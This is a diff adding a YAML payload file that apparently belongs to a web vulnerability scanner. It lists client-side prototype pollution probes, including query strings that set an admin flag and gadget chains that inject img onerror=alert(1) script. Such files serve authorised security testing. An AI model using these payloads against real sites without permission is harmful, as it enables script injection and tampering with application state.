@@ -1,0 +1,12 @@
+payload:
+  - '/?__proto__[admin]=1'
+  - '/?__proto__.admin=1'
+  - '/?__proto__[xxx]=alert(1)'
+  - '/?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E'
+  - '/?__proto__[src]=image&__proto__[onerror]=alert(1)'
+  - '/?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)'
+encoder:
+  - Plain
+placeholder:
+  - URLPath
+type: PrototypePollutionClientSide
